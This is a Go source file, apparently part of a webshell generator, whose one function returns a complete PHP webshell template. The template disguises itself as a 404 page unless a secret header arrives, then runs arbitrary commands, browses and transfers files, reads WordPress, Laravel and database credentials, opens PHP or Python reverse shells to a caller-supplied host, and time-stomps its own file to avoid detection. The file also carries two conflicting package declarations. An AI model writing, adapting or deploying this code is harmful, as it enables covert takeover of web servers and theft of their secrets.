package template
// internal/generator/templates.go - PHP SHELL TEMPLATES
package generator

type Template struct {
    Name        string
    Description string
    Code        string
    Features    []string
}

func LoadTemplate() string {
    // MAIN WEBSHELL TEMPLATE
    return `<?php
/**
 * __CLASS_0__ - Core Handler
 * Generated: __VAR_1__
 */

// CONFIGURATION
$__VAR_2__ = '__PASSWORD__';
$__VAR_3__ = '__HEADER_NAME__';
$__VAR_4__ = '__HEADER_VALUE__';

// STEALTH MODE - HEADER TRIGGER
$__VAR_5__ = false;
foreach(getallheaders() as $__VAR_6__ => $__VAR_7__) {
    if($__VAR_6__ == $__VAR_3__ && $__VAR_7__ == $__VAR_4__) {
        $__VAR_5__ = true;
        break;
    }
}

// 404 SPOOFING
if(!$__VAR_5__) {
    header("HTTP/1.0 404 Not Found");
    echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">";
    echo "<html><head><title>404 Not Found</title></head><body>";
    echo "<h1>Not Found</h1><p>The requested URL was not found on this server.</p>";
    echo "</body></html>";
    exit();
}

// AUTHENTICATION
if(!isset($_REQUEST['pass']) || $_REQUEST['pass'] !== $__VAR_2__) {
    header("HTTP/1.0 401 Unauthorized");
    exit("Access Denied");
}

// CORE FUNCTIONALITY
class __CLASS_1__ {
    private $__VAR_8__ = array();
    private $__VAR_9__ = '';
    
    public function __construct() {
        $this->__VAR_9__ = $this->__FUNC_0__();
    }
    
    private function __FUNC_0__() {
        $__VAR_10__ = array();
        
        // FUNCTION BYPASS ENGINE
        $__VAR_11__ = array('system', 'passthru', 'shell_exec', 'exec', 'popen', 'proc_open');
        foreach($__VAR_11__ as $__VAR_12__) {
            if(function_exists($__VAR_12__) && !in_array($__VAR_12__, explode(',', ini_get('disable_functions')))) {
                $__VAR_10__[] = $__VAR_12__;
            }
        }
        
        return $__VAR_10__;
    }
    
    public function __FUNC_1__($__VAR_13__) {
        $__VAR_14__ = '';
        
        if(is_array($this->__VAR_9__)) {
            foreach($this->__VAR_9__ as $__VAR_15__) {
                try {
                    switch($__VAR_15__) {
                        case 'system':
                            ob_start();
                            system($__VAR_13__);
                            $__VAR_14__ = ob_get_clean();
                            break;
                        case 'passthru':
                            ob_start();
                            passthru($__VAR_13__);
                            $__VAR_14__ = ob_get_clean();
                            break;
                        case 'shell_exec':
                            $__VAR_14__ = shell_exec($__VAR_13__);
                            break;
                        case 'exec':
                            exec($__VAR_13__, $__VAR_16__);
                            $__VAR_14__ = implode("\n", $__VAR_16__);
                            break;
                        case 'popen':
                            $__VAR_17__ = popen($__VAR_13__, 'r');
                            while(!feof($__VAR_17__)) {
                                $__VAR_14__ .= fread($__VAR_17__, 1024);
                            }
                            pclose($__VAR_17__);
                            break;
                        case 'proc_open':
                            $__VAR_18__ = proc_open($__VAR_13__, array(0=>array('pipe','r'),1=>array('pipe','w')), $__VAR_19__);
                            if(is_resource($__VAR_18__)) {
                                $__VAR_14__ = stream_get_contents($__VAR_19__[1]);
                                proc_close($__VAR_18__);
                            }
                            break;
                    }
                    
                    if(!empty($__VAR_14__)) break;
                } catch(Exception $__VAR_20__) {
                    continue;
                }
            }
        }
        
        return $__VAR_14__;
    }
    
    public function __FUNC_2__($__VAR_21__) {
        $__VAR_22__ = array();
        
        if(is_dir($__VAR_21__)) {
            $__VAR_23__ = scandir($__VAR_21__);
            foreach($__VAR_23__ as $__VAR_24__) {
                if($__VAR_24__ != '.' && $__VAR_24__ != '..') {
                    $__VAR_25__ = $__VAR_21__ . '/' . $__VAR_24__;
                    $__VAR_22__[] = array(
                        'name' => $__VAR_24__,
                        'size' => is_file($__VAR_25__) ? filesize($__VAR_25__) : 0,
                        'perms' => substr(sprintf('%o', fileperms($__VAR_25__)), -4),
                        'type' => is_dir($__VAR_25__) ? 'dir' : 'file',
                        'mtime' => date('Y-m-d H:i:s', filemtime($__VAR_25__))
                    );
                }
            }
        }
        
        return $__VAR_22__;
    }
    
    public function __FUNC_3__() {
        $__VAR_26__ = array();
        
        // WORDPRESS CONFIG
        if(file_exists('../wp-config.php')) {
            $__VAR_26__['wordpress'] = file_get_contents('../wp-config.php');
        }
        
        // LARAVEL ENV
        if(file_exists('../.env')) {
            $__VAR_26__['laravel'] = file_get_contents('../.env');
        }
        
        // DATABASE CONFIG
        if(file_exists('../config/database.php')) {
            $__VAR_26__['database'] = file_get_contents('../config/database.php');
        }
        
        // ENVIRONMENT VARIABLES
        $__VAR_26__['env'] = $_ENV;
        $__VAR_26__['server'] = $_SERVER;
        
        return $__VAR_26__;
    }
    
    public function __FUNC_4__($__VAR_27__, $__VAR_28__) {
        if(file_exists($__VAR_27__)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($__VAR_27__) . '"');
            header('Content-Length: ' . filesize($__VAR_27__));
            readfile($__VAR_27__);
            exit();
        }
        return false;
    }
    
    public function __FUNC_5__($__VAR_29__, $__VAR_30__) {
        return file_put_contents($__VAR_29__, $__VAR_30__);
    }
    
    public function __FUNC_6__($__VAR_31__) {
        $__VAR_32__ = $__VAR_31__;
        $__VAR_33__ = '';
        $__VAR_34__ = '';
        
        // PHP REVERSE SHELL
        if(strpos($__VAR_31__, 'php') !== false) {
            $__VAR_33__ = 'php';
            $__VAR_34__ = 'php -r \'$s=fsockopen("' . explode(':', $__VAR_31__)[0] . '",' . explode(':', $__VAR_31__)[1] . ');exec("/bin/sh -i <&3 >&3 2>&3");\'';
        }
        
        // PYTHON REVERSE SHELL
        if(strpos($__VAR_31__, 'python') !== false) {
            $__VAR_33__ = 'python';
            $__VAR_34__ = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . explode(':', $__VAR_31__)[0] . '",' . explode(':', $__VAR_31__)[1] . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'';
        }
        
        if($__VAR_34__) {
            return $this->__FUNC_1__($__VAR_34__);
        }
        
        return "Invalid reverse shell target";
    }
    
    public function __FUNC_7__($__VAR_35__) {
        // TIME-STOMPING - Match timestamp with another file
        if(file_exists($__VAR_35__) && file_exists('../index.php')) {
            $__VAR_36__ = filemtime('../index.php');
            touch($__VAR_35__, $__VAR_36__);
            return true;
        }
        return false;
    }
}

// MAIN HANDLER
$__VAR_37__ = new __CLASS_1__();
$__VAR_38__ = '';

if(isset($_REQUEST['cmd'])) {
    $__VAR_38__ = $__VAR_37__->__FUNC_1__($_REQUEST['cmd']);
} elseif(isset($_REQUEST['dir'])) {
    $__VAR_38__ = json_encode($__VAR_37__->__FUNC_2__($_REQUEST['dir']));
} elseif(isset($_REQUEST['steal'])) {
    $__VAR_38__ = json_encode($__VAR_37__->__FUNC_3__());
} elseif(isset($_REQUEST['download'])) {
    $__VAR_37__->__FUNC_4__($_REQUEST['download'], '');
} elseif(isset($_REQUEST['upload']) && isset($_FILES['file'])) {
    $__VAR_38__ = $__VAR_37__->__FUNC_5__($_REQUEST['upload'], file_get_contents($_FILES['file']['tmp_name']));
} elseif(isset($_REQUEST['reverse'])) {
    $__VAR_38__ = $__VAR_37__->__FUNC_6__($_REQUEST['reverse']);
} elseif(isset($_REQUEST['stomp'])) {
    $__VAR_38__ = $__VAR_37__->__FUNC_7__(__FILE__) ? 'Timestamp updated' : 'Failed';
}

// OUTPUT
if($__VAR_38__ !== '') {
    if(is_string($__VAR_38__)) {
        echo $__VAR_38__;
    } else {
        echo json_encode($__VAR_38__, JSON_PRETTY_PRINT);
    }
}

// TIME-STOMPING ON ACCESS (OPTIONAL)
if(__STEALTH_LEVEL__ >= 3) {
    $__VAR_37__->__FUNC_7__(__FILE__);
}

?>
`
}